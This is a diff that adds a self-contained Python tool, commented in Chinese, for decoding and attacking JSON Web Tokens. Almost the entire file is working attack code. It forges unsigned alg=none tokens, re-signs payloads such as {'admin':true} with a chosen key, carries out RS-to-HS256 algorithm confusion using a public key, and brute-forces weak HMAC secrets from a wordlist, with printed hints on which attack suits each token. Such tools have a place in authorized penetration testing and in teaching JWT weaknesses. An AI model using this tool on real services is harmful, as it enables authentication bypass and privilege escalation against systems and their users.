@@ -1,0 +1,140 @@
+#!/usr/bin/env python3
+# jwt -- JWT 解码 / 伪造 / 弱密钥爆破（零依赖：python3 stdlib）
+# 用法:
+#   jwt <token>                      解码三段
+#   jwt forge <token> --alg none --payload '{"admin":true}'
+#   jwt forge <token> --alg HS256 --key secret --payload ...
+#   jwt confuse <token> --pubkey pub.pem   用公钥当 HMAC 密钥(算法混淆)
+#   jwt brute <token> --dict 字典文件      弱密钥爆破
+
+import argparse
+import base64
+import hashlib
+import hmac
+import json
+import sys
+
+
+def b64url_decode(s):
+    pad = "=" * (-len(s) % 4)
+    return base64.urlsafe_b64decode(s + pad)
+
+
+def b64url_encode(b):
+    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
+
+
+def decode_token(token):
+    parts = token.split(".")
+    if len(parts) < 2:
+        sys.exit("[-] 不是合法的 JWT(至少 header.payload)")
+    hdr = json.loads(b64url_decode(parts[0]))
+    payload = json.loads(b64url_decode(parts[1]))
+    print("=== Header ===")
+    print(json.dumps(hdr, indent=2, ensure_ascii=False))
+    print("=== Payload ===")
+    print(json.dumps(payload, indent=2, ensure_ascii=False))
+    if len(parts) == 3:
+        print("=== Signature ===")
+        print(parts[2])
+        print("=== 提示 ===")
+        alg = hdr.get("alg", "")
+        if alg == "none":
+            print("  alg=none: 直接删签名段即可伪造")
+        elif alg == "HS256":
+            print("  HS256 弱密钥: jwt brute <token> --dict 字典")
+        elif alg.startswith("RS"):
+            print("  RS 系列: 若服务端拿公钥验签, 可试算法混淆(HS256+公钥当密钥)")
+    return hdr, payload
+
+
+def sign(header, payload, key, alg):
+    data = b64url_encode(json.dumps(header, separators=(",", ":"), ensure_ascii=False).encode()) + "." + \
+           b64url_encode(json.dumps(payload, separators=(",", ":"), ensure_ascii=False).encode())
+    if alg == "none":
+        return data + "."
+    if alg in ("HS256", "HS384", "HS512"):
+        h = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}[alg]
+        sig = hmac.new(key.encode(), data.encode(), h).digest()
+        return data + "." + b64url_encode(sig)
+    sys.exit(f"[-] 不支持的算法: {alg}")
+
+
+def forge(token, alg, key, payload):
+    hdr, _ = decode_token(token)
+    hdr["alg"] = alg
+    if alg == "none":
+        hdr.pop("typ", None)
+        print("[+] 伪造结果(alg=none):")
+        print(sign(hdr, payload, "", "none"))
+    else:
+        print(f"[+] 伪造结果(alg={alg}, key={key}):")
+        print(sign(hdr, payload, key, alg))
+
+
+def confuse(token, pubkey_path):
+    hdr, payload = decode_token(token)
+    hdr["alg"] = "HS256"
+    key = open(pubkey_path, "rb").read()
+    print(f"[+] 算法混淆: RS->HS256, 用公钥 {pubkey_path} 当 HMAC 密钥")
+    print(sign(hdr, payload, key.decode(), "HS256"))
+
+
+def brute(token, dict_path):
+    _, payload = decode_token(token)
+    try:
+        parts = token.split(".")
+        data = parts[0] + "." + parts[1]
+        target = parts[2]
+    except IndexError:
+        sys.exit("[-] token 缺少签名段")
+    alg = json.loads(b64url_decode(parts[0])).get("alg", "HS256")
+    h = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}.get(alg, hashlib.sha256)
+    print(f"[*] 爆破 {alg} 弱密钥...")
+    n = 0
+    with open(dict_path, errors="replace") as f:
+        for line in f:
+            k = line.rstrip("\r\n")
+            if not k:
+                continue
+            n += 1
+            sig = b64url_encode(hmac.new(k.encode(), data.encode(), h).digest())
+            if sig == target:
+                print(f"[+] 找到密钥: {k}")
+                print(f"[+] 伪造: {sign(json.loads(b64url_decode(parts[0])), payload, k, alg)}")
+                return
+    print(f"[-] 未命中({n} 条)")
+
+
+def main():
+    ap = argparse.ArgumentParser(prog="jwt", description="JWT 解码/伪造/爆破(零依赖)")
+    ap.add_argument("cmd", nargs="?", default="decode",
+                    help="decode|forge|confuse|brute（默认 decode）")
+    ap.add_argument("token")
+    ap.add_argument("--alg", default="none", help="forge 算法(默认 none)")
+    ap.add_argument("--key", default="", help="forge HS256 密钥")
+    ap.add_argument("--payload", default="", help="伪造的 payload JSON")
+    ap.add_argument("--pubkey", default="", help="confuse 的公钥文件")
+    ap.add_argument("--dict", default="", help="brute 字典文件")
+    args = ap.parse_args()
+
+    if args.cmd == "decode":
+        decode_token(args.token)
+    elif args.cmd == "forge":
+        if not args.payload:
+            sys.exit("[-] --payload 必填(JSON)")
+        forge(args.token, args.alg, args.key, json.loads(args.payload))
+    elif args.cmd == "confuse":
+        if not args.pubkey:
+            sys.exit("[-] --pubkey 必填")
+        confuse(args.token, args.pubkey)
+    elif args.cmd == "brute":
+        if not args.dict:
+            sys.exit("[-] --dict 必填")
+        brute(args.token, args.dict)
+    else:
+        sys.exit("[-] 未知命令: decode|forge|confuse|brute")
+
+
+if __name__ == "__main__":
+    main()
